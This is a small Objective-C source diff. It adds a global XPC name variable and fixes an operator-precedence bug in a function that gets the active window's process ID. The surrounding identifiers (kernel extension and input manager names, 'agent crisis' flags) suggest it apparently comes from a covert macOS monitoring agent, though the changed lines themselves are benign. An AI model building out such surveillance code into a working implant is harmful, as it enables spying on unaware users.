@@ -87,6 +87,7 @@ NSString *gConfigurationUpdateName  = nil;
 NSString *gInputManagerName         = nil;
 NSString *gKext32Name               = nil;
 NSString *gKext64Name               = nil;
+NSString *gXPCName                  = nil;
 UInt32    gAgentCrisis              = CRISIS_STOP;
 NSMutableArray  *gAgentCrisisNet    = nil;
 NSMutableArray  *gAgentCrisisApp    = nil;
@@ -1050,7 +1051,7 @@ NSDictionary *getActiveWindowInfo()
                        unsignedIntValue];
   
   // Get PID of the active Application(s)
-  if (success = GetProcessPID(&psn, &pid) != 0)
+  if ((success = GetProcessPID(&psn, &pid)) != 0)
     return nil;
   
   // Window list front to back
